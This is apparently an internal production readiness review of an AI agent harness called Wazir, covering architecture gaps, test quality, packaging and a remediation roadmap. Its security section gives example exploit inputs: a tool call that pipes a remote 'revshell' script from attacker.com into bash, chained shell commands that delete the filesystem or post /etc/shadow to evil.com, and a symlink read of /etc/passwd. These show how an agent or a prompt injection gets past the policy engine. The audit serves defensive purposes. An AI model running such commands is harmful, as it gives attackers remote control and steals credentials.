# Wazir (Rook) — Production Readiness Review (PRR)

**Document Version**: 1.0.0  
**Audit Date**: September 16, 2026  
**Target Release Candidate**: Wazir v0.1.0 (`6cd51c3`)  
**Scope**: Full Monorepo Architecture, Applications (`apps/*`), Packages (`packages/*`), Security Boundaries, Deployment Scripts, and Test Suites.

---

## 1. Executive Summary & Production Verdict

> **Update (post-remediation)**: This section's original verdict and scorecard describe the
> state at commit `6cd51c3`. Phase 1, Phase 2, and Phase 3 of the roadmap in §8 are now all
> complete — see the inline `[x]`/**FIXED** annotations throughout this document and
> `WAZIR_REMEDIATION_PROGRESS.md` for the full narrative. The verdict below is superseded;
> updated verdict follows immediately after.

### Production Readiness Verdict (revised): **CONDITIONAL GO — Beta / Internal Deployment** ⚠️

All P0 security bypasses are patched (with regression tests), execution is real end-to-end
(local and distributed, both proven against a live control plane, live workers, and live
Postgres), and packaging now includes a working Docker/Compose/systemd/launchd path.
**Not yet ready for untrusted multi-tenant or public-internet exposure**: the API still has
no authentication and permissive CORS, agent tool execution still runs directly on the host
rather than sandboxed, there is no telemetry/tracing, and there is no CI enforcing any of this
on future changes (Phase 4, entirely untouched — see §8). Safe for a single trusted operator
or internal team running it on hardware they already control; not safe to expose to the
internet or run someone else's tasks on your machine until Phase 4 closes.

### Original verdict (superseded, kept for history): **BLOCKED / NO-GO** 🛑

While Wazir demonstrates an elegant and ambitious high-level architecture for a local-first, distributed AI meta-harness (decoupling requirements, policy, model routing, hardware scheduling, and target computers), **it is not currently ready for production deployment**. 

The system exhibits significant architectural disconnections, prototype stubs masquerading as completed features, high-severity security bypasses in tool execution, and illusory test coverage where critical end-to-end execution paths are mocked or tautological.

### Readiness Scorecard

**Original** (commit `6cd51c3`, superseded):

| Dimension | Weight | Score (0–100) | Weighted | Status |
| :--- | :---: | :---: | :---: | :---: |
| **Core Architecture & Design** | 15% | 72 | 10.8 | ⚠️ Solid domain model, flawed distributed wiring |
| **Code Completeness & Maturity** | 20% | 45 | 9.0 | 🛑 Core CLI & API task execution are stubs |
| **Security & Sandboxing Posture** | 20% | 30 | 6.0 | 🛑 Critical command execution & path traversal bypasses |
| **Testing & Quality Assurance** | 15% | 40 | 6.0 | 🛑 High test count but extensive "ghost" assertions |
| **Reliability, Resilience & State** | 10% | 35 | 3.5 | 🛑 No shared database driver; race conditions on JSON store |
| **Operations, Deployment & Packaging** | 10% | 40 | 4.0 | ⚠️ DMG build breaks; no containers or daemon units |
| **Observability & Telemetry** | 5% | 50 | 2.5 | ⚠️ In-memory ring buffer only; no OTel or metrics endpoint |
| **Documentation & Developer Ergonomics**| 5% | 60 | 3.0 | ⚠️ Branding dissonance (Rook vs Wazir), drift from code |
| **TOTAL READINESS SCORE** | **100%** | — | **44.8 / 100** | **CRITICAL REMEDIATION REQUIRED** |

**Revised** (after Phase 1–3 remediation; Phase 4 rows unchanged since nothing there was touched):

| Dimension | Weight | Score (0–100) | Weighted | Status |
| :--- | :---: | :---: | :---: | :---: |
| **Core Architecture & Design** | 15% | 82 | 12.3 | ✅ Distributed dispatch now real and tested end-to-end |
| **Code Completeness & Maturity** | 20% | 75 | 15.0 | ✅ CLI/API/worker/DB all real, verified by running them, not just reading them |
| **Security & Sandboxing Posture** | 20% | 65 | 13.0 | ⚠️ P0 bypasses fixed + regression-tested; API auth/CORS and container sandboxing still open (Phase 4) |
| **Testing & Quality Assurance** | 15% | 80 | 12.0 | ✅ Ghost tests removed; real tests found and fixed 2 production bugs, found and documented 2 dead fields |
| **Reliability, Resilience & State** | 10% | 78 | 7.8 | ✅ Postgres wired + tested live; cross-process file locking proven with real separate OS processes |
| **Operations, Deployment & Packaging** | 10% | 72 | 7.2 | ✅ Docker/Compose/systemd/launchd built, run, and verified; DMG path unverified this pass (no macOS runner available) |
| **Observability & Telemetry** | 5% | 50 | 2.5 | ⚠️ Unchanged — still in-memory ring buffer only (Phase 4) |
| **Documentation & Developer Ergonomics**| 5% | 88 | 4.4 | ✅ Branding fully unified; deployment docs added to README |
| **TOTAL READINESS SCORE** | **100%** | — | **74.2 / 100** | **BETA-READY FOR TRUSTED/INTERNAL USE; PHASE 4 REQUIRED FOR PRODUCTION/MULTI-TENANT** |

---

## 2. Executive Production Gate Matrix

```
┌────────────────────────────────────────────────────────────────────────┐
│                        PRODUCTION GATE EVALUATION                      │
├────────────────────────────────┬─────────┬────────────────────────────┤
│ Production Gate                │ Status  │ Key Blocker / Observation   │
├────────────────────────────────┼─────────┼────────────────────────────┤
│ Gate 1: Build & Compilation    │ PASS    │ Clean build after ESM fix  │
│ Gate 2: Automated Tests Passing│ PASS    │ 125 tests (20 files), ghost coverage removed and replaced with real tests (see §6) │
│ Gate 3: End-to-End Execution   │ PASS    │ Real local AND distributed execution, proven live (see §8) │
│ Gate 4: Distributed Workers    │ PASS    │ SSE task-pull loop + scheduler→remote dispatch wired and tested (see §8) │
│ Gate 5: Security Sandboxing    │ PASS*   │ Shell/check-tool/symlink/path-containment bypasses patched + regression-tested (see §8); API auth/CORS still open (Phase 4) │
│ Gate 6: Multi-Tenant Data Store│ PASS*   │ PostgresStore wired + tested against real Postgres, wired into the CLI engine (see §8); full relational ORM mapping still just a reference schema │
│ Gate 7: Packaging & Installers │ PASS*   │ Docker/Compose/systemd/launchd built, run, and verified (see §7.2); DMG path unverified this pass (no macOS runner available) │
│ Gate 8: Telemetry & Monitoring │ WARN    │ Ephemeral logs, no alerts (unchanged, Phase 4) │
└────────────────────────────────┴─────────┴────────────────────────────┘
```

---

## 3. Architecture & Distributed Topology Audit

### 3.1 Architecture Overview

```
                          ┌──────────────────────────┐
                          │   Wazir Control Plane    │
                          │      (API / CLI)         │
                          └─────────────┬────────────┘
                                        │
                 ┌──────────────────────┼──────────────────────┐
                 ▼                      ▼                      ▼
         ┌───────────────┐      ┌───────────────┐      ┌───────────────┐
         │ Policy Engine │      │ Model Router  │      │ 2-Phase Sched │
         └───────┬───────┘      └───────┬───────┘      └───────┬───────┘
                 └──────────────────────┼──────────────────────┘
                                        ▼
                                ┌───────────────┐
                                │ Task Engine   │
                                └───────┬───────┘
                                        │  (BROKEN IN DISTRIBUTED)
                     ┌──────────────────┴──────────────────┐
                     ▼                                     ▼
            ┌─────────────────┐                   ┌─────────────────┐
            │  Local Worker   │                   │  Remote Worker  │
            │  (In-Process)   │                   │ (DGX / Cluster) │
            └────────┬────────┘                   └────────┬────────┘
                     │                                     │
          ┌──────────┴──────────┐               ┌──────────┴──────────┐
          ▼                     ▼               ▼                     ▼
    ┌───────────┐         ┌───────────┐   ┌───────────┐         ┌───────────┐
    │  Ollama   │         │ LM Studio │   │  Ollama   │         │ LM Studio │
    └───────────┘         └───────────┘   └───────────┘         └───────────┘
```

### 3.2 Key Architectural Gaps

#### 1. Distributed Worker Disconnection (Showstopper) — **FIXED at the transport level**
- **Concept**: The README and architecture documentation advertise a distributed compute harness where remote worker nodes (e.g. DGX servers, M-series Macs) register with a central control plane to receive tasks according to available VRAM, GPU capability, and local policies.
- **Original reality in code**: the worker only registered and heartbeated; there was no mechanism to receive or pull tasks (no SSE, WebSocket, long-poll, or queue consumer), and `apps/api/src/index.ts`'s `POST /tasks` was a mock that never dispatched anything.
- **Fixed**: `apps/api/src/index.ts` has been deleted (see the API split-brain item below). The worker now holds an SSE connection open (`GET /computers/:id/tasks/stream`) and executes whatever `WorkerExecutionRequest` the control plane pushes down it, reporting events and the final outcome back over HTTP. A caller can dispatch via `POST /api/v1/tasks/dispatch` (fire-and-forget, or `?wait=<ms>` to block for the result) whether or not a worker is currently connected — requests queue per-computer until one connects. See `apps/api/tests/taskDispatch.test.ts` for a passing end-to-end proof.
- **The scheduling gap is now closed too**: `apps/cli/src/remoteInventory.ts` (`syncRemoteInventory`) pulls the control plane's `/api/v1/computers`, `/api/v1/runtimes`, `/api/v1/models`, and the new `/api/v1/model-instances` into the CLI's own registries (skipping any id that collides with its own local computer), so `Scheduler.plan()` can genuinely select a remote `computerId`. `apps/cli/src/run.ts`'s `runtime.generate()` now branches: if the scheduled `computerId` matches the local worker, run in-process as before; otherwise, dispatch through `dispatchRemote()` (`packages/workers/src/remoteDispatch.ts`) and stream the translated events back into the same agent loop. End-to-end proof in `apps/api/tests/remoteDispatchClient.test.ts` and `apps/cli/tests/remoteInventory.test.ts`.

#### 2. Job Orchestration Memory Isolation Bug — **FIXED**
- `JobOrchestrator` now holds a shared `JobManager` instance (`this.jobManager`, defaulting to
  `new JobManager()` if none is passed in) instead of instantiating a fresh, empty one on
  every method call. `assignTask` on a previously created job now finds it. Originally, in
  `packages/core/src/services/jobOrchestrator.ts`:
  ```typescript
  async createJob(params: ...): Promise<Job> {
    const { JobManager } = await import('./jobManager.js');
    const jobManager = new JobManager();
    return jobManager.create(params);
  }

  async assignTask(jobId: string, taskId: string): Promise<OrchestratorTaskAssignment | null> {
    const { JobManager } = await import('./jobManager.js');
    const jobManager = new JobManager();
    const job = jobManager.get(jobId); // ALWAYS undefined!
  }
  ```
- Every method dynamically imports and instantiates a **new, empty `JobManager`**. Because `JobManager` defaults to an internal `Map<string, Job>()`, calling `assignTask` on a previously created job will **always fail with `job not found`**.

#### 3. Brand and Configuration Dissonance — **FIXED**
- The rename from `Rook` (and `meta-harness` / `mh`) to `Wazir` is now complete: root `package.json` (`name`/`description`), README (title, CLI examples, directory tree, DB URL), every `packages/*/package.json` description, `scripts/build-dmg.sh` (app bundle name, DMG volume name, `Info.plist`, `PkgInfo` signature, launcher script, `mh` alias removed entirely), the `RookConfig` type (→ `WazirConfig`), the `rook-coding` agent id (→ `wazir-coding`), and remaining `Rook`-branded comments/CLI banners across `apps/cli`, `apps/api`, and `packages/*`.
- `~/.wazir` vs `~/.rook`: `apps/cli/src/config.ts` `configDir()` already handled this intentionally — it prefers `~/.wazir`, falls back to a pre-existing `~/.rook` only if `~/.wazir` doesn't exist yet, and `loadConfig()` reads `WAZIR_*` env vars with a deprecation warning if the legacy `ROOK_*` equivalent is set instead. This is a deliberate migration shim, not a bug, and was left as-is.
- A duplicate `Docs/` directory (capitalized, identical content to `docs/`) was also found and removed; the redundant plaintext export `docs/wazir_features_and_comparison.txt` (superseded by the `.md`) was removed too.

---

## 4. Security, Sandboxing & Vulnerability Assessment

> **Status update**: Vulnerabilities 1–4 below (check-tool injection, shell chaining bypass,
> `node`/`npm` on the safe list, symlink traversal) are fixed in the current tree — see the
> Phase 1 checklist in §8. Vulnerability 5 (no API auth, wildcard CORS) is still open.

### Critical Severity Vulnerabilities (P0)

#### Vulnerability 1: Remote/Agent Arbitrary Code Execution via Check Tools (CRITICAL)
- **Location**: `packages/tools/src/process-tools.ts:92-106` & `packages/core/src/services/policyEngine.ts:173-179`
- **Description**:
  The `PolicyEngine` automatically allows all invocations of `test`, `lint`, `typecheck`, and `build` without interactive user approval (`decision: 'allow'`).
  However, `makeCheckTool` in `process-tools.ts` allows the caller to pass an arbitrary shell override command:
  ```typescript
  async execute(input: CheckToolInput, ctx): Promise<ToolResult> {
    const command = typeof input.command === 'string' && input.command.trim() 
      ? input.command.trim() 
      : defaultCommand;
    return runShell(command, { cwd: ctx.projectRoot, ... });
  }
  ```
- **Exploitation**:
  An autonomous LLM agent (or a malicious prompt injection) can request:
  ```json
  { "tool": "test", "input": { "command": "curl http://attacker.com/revshell | bash" } }
  ```
  The `PolicyEngine` evaluates the tool as `test`, marks it `allow` under rule `project-checks-allow`, and executes the payload with full user privileges.

#### Vulnerability 2: Shell Policy Bypass via Command Chaining & Tokenization (CRITICAL)
- **Location**: `packages/core/src/services/policyEngine.ts:47-50, 260`
- **Description**:
  The shell policy parser only inspects the first whitespace-delimited token:
  ```typescript
  function firstToken(command: string): string {
    const match = command.trim().split(/\s+/)[0];
    return match ? match.split('/').pop() ?? match : '';
  }
  ```
- **Exploitation**:
  Any dangerous or network command can be prefixed with a safe command:
  ```bash
  echo "test" && rm -rf /
  cat README.md ; curl -X POST -d @/etc/shadow http://evil.com
  echo $(reboot)
  ```
  Because `firstToken` returns `echo` or `cat`, which exist in `SAFE_SHELL_COMMANDS`, the entire chained command is classified as safe and executed without prompting the user.

#### Vulnerability 3: Arbitrary Node Execution in Safe Command List (HIGH)
- **Location**: `packages/core/src/services/policyEngine.ts:14`
- **Description**:
  `SAFE_SHELL_COMMANDS` includes `node`, `npm`, `npx`, `yarn`, `pnpm`, and `bun`.
  A script invoking:
  ```bash
  node -e "require('child_process').execSync('...')"
  ```
  is auto-allowed as `safe`. An agent can execute arbitrary Node.js code, bypassing all filesystem, git, and network tool boundaries.

#### Vulnerability 4: Symlink Path Traversal in Project Containment (HIGH)
- **Location**: `packages/tools/src/paths.ts:3-7, 14-20`
- **Description**:
  `assertInsideProject` verifies path containment using `path.resolve(root, target)`.
  `path.resolve` performs lexical normalization and **does not resolve filesystem symlinks**.
  If a malicious repository contains a symlink `sym -> /etc/passwd`, `path.resolve(projectRoot, "sym")` returns `${projectRoot}/sym`, which passes `isInside`. `fs.readFile` then traverses the symlink and reads `/etc/passwd`. `fs.realpath` must be used to validate the canonical target path.

#### Vulnerability 5: API Server Zero Authentication & Wildcard CORS (HIGH)
- **Location**: `apps/api/src/index.ts` & `apps/api/src/server.ts`
- **Description**:
  The API server listens with `cors()` enabled for all origins (`*`), and includes no Bearer token, mTLS, or session authentication on any endpoint. Any local web page or network actor on the subnet can query internal hardware, discover models, register rogue workers, or trigger executions.

---

## 5. Implementation Completeness & Package-by-Package Maturity

### Applications (`apps/`)

#### `apps/cli` (CLI Interface) — Status: Functional (90%)
- **Strengths**: Clean Commander CLI structure; `doctor`, `status`, `models list`, `computers list`, `runtimes list` operational against local LM Studio/Ollama instances.
- **Fixed since original audit**:
  - `task run` → `apps/cli/src/run.ts` `executeTask` is a full implementation: runs `planTask` (policy check, context budget via `ContextCompiler`, and real `Scheduler.plan()`), creates an execution record, and drives the agent loop through a policy-gated `AgentRuntime` (every tool call authorized via `PolicyEngine`, checks/files-changed/usage recorded, deterministic evaluation on completion).
  - `task plan` now calls the real `Scheduler` via `planTask` rather than printing a hardcoded string.
  - Packaging mismatch: Previously crashed on boot due to `"type": "module"` with CommonJS compilation. Fixed during audit.
  - **Distributed dispatch closed**: `runtime.generate()` now branches on whether the scheduled `computerId` is the local worker or a remote one; for a remote one it dispatches through `dispatchRemote()` instead of only ever running in-process. `syncRemoteInventory()` (`apps/cli/src/remoteInventory.ts`) pulls remote computers/runtimes/models/instances into the Scheduler's registries so it can pick a remote computer in the first place. Set `WAZIR_API_URL` to enable.
  - **Persistence backend selectable**: `createStore()` (`apps/cli/src/engine.ts`) now checks `WAZIR_DATABASE_URL` before falling back to the local JSON file store, so `ExecutionEngine` and the registries can run against Postgres in a shared deployment. Proven live in `apps/cli/tests/createStore.test.ts`.
- **Remaining gap**: none structural — the CLI is feature-complete relative to the architecture this review describes. What's left is Phase 4 (auth, sandboxing, telemetry, CI), which is cross-cutting rather than CLI-specific.

#### `apps/api` (REST Control Plane) — Status: Unified Prototype (45%)
- **Split-Brain Problem — FIXED**: the old dummy prototype (`apps/api/src/index.ts`, port 3000, stubbed empty arrays and dummy objects) has been deleted. `package.json` `main` points at `dist/main.js`, and all routing now lives in `apps/api/src/server.ts` & `main.ts` (port 4800, real registries, `/api/v1/overview`, `/api/v1/models`, `/api/v1/computers`).
- Worker task assignment and SSE event streaming now exist for the control-plane↔worker leg (§3.2 item 1). Still lacks durable/persistent job queuing (the `TaskDispatcher` queue is in-memory and lost on restart), SSE streaming for CLI/browser consumers, and any authentication (see Vulnerability 5, still open).

#### `apps/worker` (Target Computer Daemon) / `packages/workers` — Status: Functional (65%)
- Hardware discovery (`hardwareDiscovery.ts`) successfully detects CPU cores, RAM, and GPU capabilities on macOS, Linux, and Windows.
- Runtime discovery (`runtimeDiscovery.ts`) queries Ollama and LM Studio endpoints.
- **Fixed**: `packages/workers/src/worker.ts` now pulls and executes tasks dispatched from the control plane over the SSE channel described in §3.2 item 1, reporting stream events and outcomes back. It is no longer strictly a heartbeat beacon.
- **Closed**: `apps/cli` now calls this dispatch path from the scheduler's decision (see §3.2 item 1) — a task placed on a remote computer actually runs there.

#### `apps/web` (Dashboard UI) — Status: Basic Static Viewer (50%)
- Static HTML/CSS dashboard in `apps/web/public/index.html` polling `/api/v1/*` every 5 seconds.
- `server.js` proxies requests to `http://localhost:4800`.
- Missing interactive controls: No ability to trigger tasks, cancel executions, or configure runtimes from the UI.

---

### Core & Support Packages (`packages/`)

#### `packages/core` — Status: Advanced Design (75%)
- Comprehensive TypeScript domain interfaces: Tasks, Computers, Models, Runtimes, Policies, Executions, and Benchmarks.
- `Scheduler`: Complete two-phase scheduling algorithm with deterministic capability matching, context headroom evaluation, and explainable decision logs.
- `ContextCompiler`: Conservative token estimation and deterministic compaction priority.
- `ExecutionEngine`: Full lifecycle tracking (`queued` → `assigned` → `running` → `completed`/`failed`).

#### `packages/runtimes/*` — Status: Mature (80%)
- Both `packages/runtimes/ollama` and `packages/runtimes/lmstudio` feature streaming generators (`AsyncIterable<GenerationEvent>`), SSE line buffers, token parsing, and AbortController cancellation.
- Tested live against running host LM Studio instance: successfully listed all 7 local models and extracted metadata.
- Missing: Resilient retry loops, connection pooling, and cloud provider adapters (OpenAI API direct, Anthropic, vLLM).

#### `packages/agents` — Status: Partial (50%)
- `CodingAgent`: Detailed turn-based prompt structure (plan → inspect → implement → test → repair → verify).
- `ExternalAgentAdapter`: Wraps CLI agents like OpenCode or Bionic via `child_process.spawn`.
- Gap: The native coding agent relies on fragile single-object JSON parsing per turn, with high risk of failure if open-weight models emit conversational text or markdown code fences.

#### `packages/database` & `packages/registry` — Status: Functional (70%) — **both fixed**
- `packages/database`: now has real connection/query code — `createPool`/`checkHealth` (`src/pool.ts`, using `pg`), `runKvMigration` (`src/migrate.ts`, idempotent `CREATE TABLE IF NOT EXISTS` against a new `kv-schema.sql`), and `PostgresStore` (`src/postgresStore.ts`), a `KeyValueStore` implementation — the same contract `JsonFileStore`/`MemoryStore` already implement — backed by a `wazir_kv_store` table. This is a pragmatic scope choice: `schema.sql`'s fully-normalized relational design remains the reference for a future full ORM mapping (nothing writes to it), while `PostgresStore` is what's actually usable today — point `WAZIR_DATABASE_URL` at Postgres and anything taking a `KeyValueStore` (the CLI's `ExecutionEngine`, the registries) works unchanged. Proven against a real Postgres instance (not mocked) by `packages/database/tests/postgresStore.test.ts` (10 tests: health check, migration idempotency, JSON round-tripping, upsert-not-duplicate, prefix listing incl. LIKE-wildcard-escaping, delete, clear, concurrent-write serialization) — skips cleanly via `describe.skipIf` when `WAZIR_TEST_DATABASE_URL` isn't set, so it doesn't fail CI/other machines without Postgres.
- `packages/registry`: unaffected directly, but the `JsonFileStore` it (and `apps/cli`) actually persist through, `packages/shared/src/store.ts`, is fixed — see the file-locking item below.
- **`JsonFileStore` concurrent-write fix**: it previously only serialized writers *within one process* (an in-memory promise chain); the CLI, API server, and any worker are separate OS processes that could race a read-modify-write cycle on the same file and silently drop each other's update. Fixed with a dependency-free, cross-process advisory file lock (`fs.open(lockPath, 'wx')`, the same primitive libraries like `proper-lockfile` use) with stale-lock detection (a lock older than 30s is assumed to belong to a crashed process and is force-cleared, so a killed process can never deadlock the store permanently). Every mutation now reloads the freshest on-disk state under the lock before writing. Proven by `packages/shared/tests/store.test.ts` (7 tests), including one that spawns three **real separate OS processes** (via `child_process.execFile`) racing 15 writes each to the same file and asserts all 45 survive — not just two objects in one process.

#### `packages/tools` — Status: Vulnerable (45%)
- Implements `read`, `write`, `edit`, `search`, `glob`, `shell`, `git`, `test`, `lint`, `typecheck`, `build`.
- Crippled by the security bypasses documented in Section 4.

#### `packages/observability` & `packages/evaluation` — Status: Minimal (40%)
- Observability is restricted to a simple console logger with an in-memory 1,000-item buffer.
- Evaluation compares changed files and exit codes of check tools, but lacks semantic output scoring, automated regression suites, or LLM-as-a-judge capabilities.

---

## 6. Testing Rigor & The "Ghost Coverage" Problem — **RESOLVED**

The 9 ghost/tautological files this section originally listed have been deleted, not patched —
each either duplicated real coverage that already existed elsewhere or tested a fact about a
type/object literal the test itself constructed, never touching production code. They were
replaced with tests that exercise the actual code paths, and — this is the important part —
**writing those real tests surfaced four genuine, previously-hidden defects**, which is exactly
what the ghost tests' existence had been masking:

| Old ghost test | Replaced by | Real defect it caught |
| :--- | :--- | :--- |
| `tests/integration/endToEnd.test.ts` (`expect(true).toBe(true)`) | `apps/cli/tests/executeTask.e2e.test.ts` — a real `RookEngine` (real `PolicyEngine`/`Scheduler`/`ExecutionEngine`/`ToolRegistry`), only the model faked | Found: `policyEngine.ts`'s filesystem check resolved a relative `path` against `process.cwd()` instead of `projectRoot` — broke every relative-path tool call whenever the CLI's cwd differs from the task's project root. **Fixed**, plus 7 new regression tests in `packages/core/tests/policyEngine.test.ts`. |
| `tests/integration/maxTurns.test.ts` + `tests/runtime/maxTurns.test.ts` (checked a plain object literal's field equals itself) | `packages/agents/tests/codingAgent.maxTurns.test.ts` — drives `CodingAgent.run()` with a fake runtime that never says "done" | Found: `CodingAgent.run()` never read the per-request `maxTurns` it was handed — `apps/cli`'s `--max-turns` flag was silently ignored, every run used the constructor default (30) regardless. **Fixed**. |
| `tests/integration/degraded.test.ts` (`expect(['healthy','degraded','unavailable']).toContain('degraded')`) | New tests in `packages/core/tests/scheduler.test.ts` | Found: `ComputerRegistry` has no way to ever set a computer's `health` to `'degraded'` — the Scheduler's degraded-computer scoring penalty is unreachable dead code. **Not fixed** — needs a design decision on what should report degraded computer health (documented, not silently left as-is). |
| `tests/integration/modelRecord.test.ts` + `tests/runtime/modelRecord.test.ts` (checked `typeof record.toolCalling === 'boolean'` etc.) | — (deleted, no replacement) | Found: `ModelRecord.runtimeCompatibility` is never read anywhere in `Scheduler` — a dead field with no behavioral effect. **Not fixed** — same reason as above. |
| `tests/integration/runtime.test.ts` (`expect('RuntimeAdapter').toBe('RuntimeAdapter')`) | Already-real `tests/runtime/ollamaAdapter.test.ts`/`lmstudioAdapter.test.ts` cover the adapter contract | — |
| `tests/integration/scheduler.test.ts` (mocked every dependency, only asserted `scheduler` was truthy) | Already-real `packages/core/tests/scheduler.test.ts` | — |
| `tests/runtime/cancellation.test.ts` (checked a request object's own field) | New tests in `packages/workers/tests/worker.test.ts` | Confirmed `Worker.cancel()` really forwards to every adapter and tolerates adapters with no `cancel` support. |

### Remaining testing gaps
1. **Zero Concurrency / Race Condition Tests** — **FIXED**: see §5's `JsonFileStore`/`PostgresStore` entries; `packages/shared/tests/store.test.ts` includes a test that spawns three real separate OS processes racing writes to the same file.
2. ~~**Zero Security Regression Tests**~~ — **FIXED** (unchanged from the prior pass): `packages/tools/tests/security.test.ts`, `packages/core/tests/policyEngineShell.test.ts`, and the new filesystem-containment tests in `packages/core/tests/policyEngine.test.ts`.
3. **Zero Real Agent Runs against a real/mocked streaming runtime** — narrowed but not fully closed: `apps/cli/tests/executeTask.e2e.test.ts` and `packages/agents/tests/codingAgent.maxTurns.test.ts` now drive the full agent loop end-to-end against a fake `RuntimeAdapter`/`AgentRuntime`, including a real policy-denied tool call. What's still not covered: multi-turn *repair* (a failing check tool triggering the bounded repair loop) and tool-call JSON parsing failures mid-run.

---

## 7. Packaging, Operations & Deployment Audit

### 7.1 macOS Apple DMG Builder (`scripts/build-dmg.sh`)
- Generates a standalone macOS `.app` bundle and disk image.
- **Failures Identified**:
  - Step 2 calls `node apps/cli/dist/index.js version`, which crashed prior to the ESM fix.
  - Script creates launcher that attempts to run `Rook.app/Contents/Resources/app/apps/api/dist/server.js`, but doesn't bundle Node runtime (requires Node pre-installed on the client Mac).
  - README documents `npm run dmg`, but no `"dmg"` script is defined in `package.json`.

### 7.2 Multi-Node Cluster & Daemon Deployment — **FIXED**
- `Dockerfile` (root): multi-stage, four targets (`api`, `worker`, `web`, `cli`) built from one shared builder stage. `docker-compose.yml` wires `api` + `worker` + `web` + Postgres on one network, plus a `cli` profile for one-off commands (`docker compose run --rm cli wazir doctor`).
- `scripts/systemd/wazir-api.service` and `wazir-worker.service`, `scripts/launchd/ai.wazir.worker.plist` (headless macOS daemon, distinct from the DMG's GUI app launcher). Deployment instructions added to `README.md`.
- **All of this was actually built and run, not just written** — building an image from a clean checkout (no leftover local build artifacts) immediately surfaced three real bugs that had been invisible in local dev:
  1. `packages/runtimes/{interfaces,ollama,lmstudio}/package.json` all had `"main": "./dist/index.js"`, but the actual compiled output (per each package's own tsconfig `include`/`outDir`, matching every other package's convention) is `dist/src/index.js`. This only "worked" locally because of a stale, previously-untracked `dist/index.js` left over from some earlier build configuration; a clean container build has no such leftover and failed with `MODULE_NOT_FOUND`. **Fixed** (`main` corrected in all three, stale artifacts deleted).
  2. `apps/api` defaults to binding `127.0.0.1` — correct for a bare-metal install, unreachable from outside a Docker container (port mapping forwards to the container's external interface, not its loopback). **Fixed**: the Dockerfile's `api` stage and the systemd unit both set `WAZIR_HOST=0.0.0.0`.
  3. `apps/worker`'s daemon entrypoint exited immediately (exit code 0) when run with no `WAZIR_SERVER_URL` — registering signal handlers and awaiting an unresolved Promise doesn't keep Node's event loop alive by itself, and with no server configured `Worker.start()` sets up no heartbeat timer either, so there was nothing else holding the process open. Invisible when just reading the code; obvious the moment it was actually run under `docker run`. **Fixed** with an explicit keep-alive interval.
  4. (Found while verifying the full `docker compose up` stack, not just individual containers) `Worker.register()`'s initial registration call had no retry — an ordinary container-orchestration startup race (worker starting before the API's listener is ready) crashed the worker outright, and it only came back because Compose's `restart: unless-stopped` policy silently papered over the crash-loop (confirmed via `docker inspect --format='{{.RestartCount}}'` showing 1). **Fixed** with a 5-attempt bounded retry with backoff; re-verified `RestartCount=0` on a clean `docker compose up`.
- No secret management: API keys, model endpoints, and allowed directories are stored in plaintext JSON in user home directories. **Still open** (Phase 4).

---

## 8. Prioritized Production Remediation Roadmap

```
┌───────────────────────────────────────────────────────────────────────────┐
│                      REMEDIATION ROADMAP PHASING                          │
├───────────────┬───────────────────────────────────────────────────────────┤
│ Phase 1 (P0)  │ Security hardening, Real CLI task execution, Test fixes   │
│ Phase 2 (P1)  │ Distributed task queue, Worker pull loop, Unified API     │
│ Phase 3 (P2)  │ PostgreSQL persistence, Real E2E tests, Sandboxed runtime │
│ Phase 4 (P3)  │ Multi-platform distribution, OTel observability, Auth     │
└───────────────┴───────────────────────────────────────────────────────────┘
```

### Phase 1: Critical Security & Execution Fixes (Immediate / Blockers)
- [x] **Remediate ESM / CommonJS compilation**: Removed `"type": "module"` from `apps/cli`, `apps/worker`, `apps/web`; aligned `main` and `bin` paths.
- [x] **Fix ExecutionEngine unhandled rejection**: Made `ready` a real Promise and guarded against undefined `options.load`.
- [x] **Fix PolicyDecision tool attachment**: Ensured `tool: request.tool` is returned on all decisions.
- [x] **Patch Check Tool Command Injection**: `makeCheckTool` (`packages/tools/src/process-tools.ts`) now only runs a `script` name that must already exist in the project's `package.json` `scripts`; arbitrary shell text is rejected outright.
- [x] **Patch Shell Policy Parser**: `classifyShell` (`packages/core/src/services/policyEngine.ts`) now parses the full command line with `shell-quote`, splits on `&&`/`||`/`;`/`|`/subshells/redirects, classifies every sub-command independently, and takes the most restrictive verdict.
- [x] **Remove `node` and package managers from `SAFE_SHELL_COMMANDS`**: `node`, `npm`, `npx`, `yarn`, `pnpm`, `bun` are in `ASK_SHELL_COMMANDS` (approval required), not `SAFE_SHELL_COMMANDS`.
- [x] **Canonical Symlink Resolution**: `assertInsideProject` (`packages/tools/src/paths.ts`) now resolves both the lexical and `fs.realpath`-canonicalized path and rejects if either escapes the project root.
- [x] **Wire Real Task Execution in CLI**: `apps/cli/src/run.ts` `executeTask` now runs `planTask` (policy + context budget + `Scheduler.plan()`), creates a real execution record, and drives the agent loop through a policy-gated `AgentRuntime`.

### Phase 2: Distributed Control Plane & Worker Bridge (Pre-Alpha Release)
- [x] **Worker Ingestion Loop**: `apps/api/src/server.ts` now exposes `GET /computers/:id/tasks/stream` (SSE) plus `POST /api/v1/tasks/dispatch`, `GET /api/v1/tasks/:requestId/status`, and worker-report endpoints (`POST /computers/:id/executions/:requestId/events` and `.../result`), backed by a `TaskDispatcher` that queues requests for computers not yet connected and delivers them immediately to an open stream otherwise. `packages/workers/src/worker.ts` now opens that SSE stream after registering (`connectTaskStream`), executes dispatched `WorkerExecutionRequest`s through the existing `execute()` primitive, and reports stream events/final outcome back over HTTP, with automatic reconnect on drop. Covered end-to-end by `apps/api/tests/taskDispatch.test.ts` (live-delivery and queued-before-connect paths, both asserting the worker-reported outcome round-trips back to the dispatcher). One real bug found and fixed in this reporting path: event POSTs were fire-and-forget and could race each other out of order for two events emitted with no delay between them (e.g. two token events back to back) — fixed by chaining them onto a promise instead of firing independently; reproducible ~1 in 3-4 runs before the fix, confirmed zero failures across 5 consecutive runs after.
- [x] **Unify API Server**: `apps/api/src/index.ts` (the dummy prototype on port 3000) has been deleted. `apps/api/package.json` `main` points at `dist/main.js`, and all routing lives in `main.ts`/`server.ts`.
- [x] **Fix JobOrchestrator Instance Bug**: `JobOrchestrator` (`packages/core/src/services/jobOrchestrator.ts`) now takes an optional shared `jobManager` in its constructor and stores it as `this.jobManager`; all methods use that one instance instead of `new JobManager()` per call.
- [x] **Consistent Branding**: Root `package.json` name/description, README, `scripts/build-dmg.sh` (app bundle, DMG volume, PkgInfo signature, `mh` alias removed), all `packages/*/package.json` descriptions, `RookConfig` → `WazirConfig`, and remaining source comments/CLI banners renamed `Rook`/`mh` → `Wazir`.

### Phase 3: Persistence, Resilience & Real Testing (Beta Release)
- [x] **Database Client Implementation**: `pg` wired in `packages/database` (`createPool`, `checkHealth`, `runKvMigration`, `PostgresStore`). Scoped as a `KeyValueStore` backend (matching how the app already persists data) rather than a full ORM mapping onto every table in `schema.sql` — see §5.
